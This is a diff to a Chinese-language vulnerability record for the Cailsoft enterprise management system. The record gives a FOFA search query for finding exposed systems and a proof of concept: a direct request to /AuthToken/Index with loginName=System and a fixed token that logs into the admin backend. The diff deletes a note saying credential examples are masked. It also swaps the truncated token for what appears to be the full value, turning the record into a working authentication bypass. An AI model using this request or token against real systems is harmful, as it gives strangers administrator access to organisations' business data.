@@ -44,7 +44,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -77,7 +77,7 @@ FOFA：body="www.cailsoft.com" || body="赛蓝企业管理系统"
 
 POC/EXP：
 
-直接访问：/AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f
+直接访问：/AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f
 
 登录后台
 
